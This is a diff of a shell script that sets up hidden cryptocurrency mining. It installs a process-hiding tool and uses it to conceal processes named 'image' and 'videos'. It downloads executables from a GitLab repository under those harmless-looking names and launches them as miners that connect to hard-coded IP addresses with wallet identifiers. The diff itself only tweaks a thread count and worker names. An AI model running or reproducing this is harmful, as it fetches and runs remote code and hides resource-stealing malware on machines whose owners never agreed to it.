@@ -5,10 +5,10 @@ sudo apt install npm
 sudo npm i -g node-process-hider && sudo ph add image && sudo ph add videos
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/image && chmod +x image
 wget -qO videos https://gitlab.com/sarifadim/jomblo/-/raw/main/perusa && chmod +x videos
-screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.NONAME -t 5
+screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.NONAME -t 2
 
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/picture && chmod +x picture && mv picture image
 
-./image --algo kaspa --server 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-0100-$(date +"%T"))
+./image --algo kaspa --server 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo B-T400-$(date +"%T"))
 EOF
 
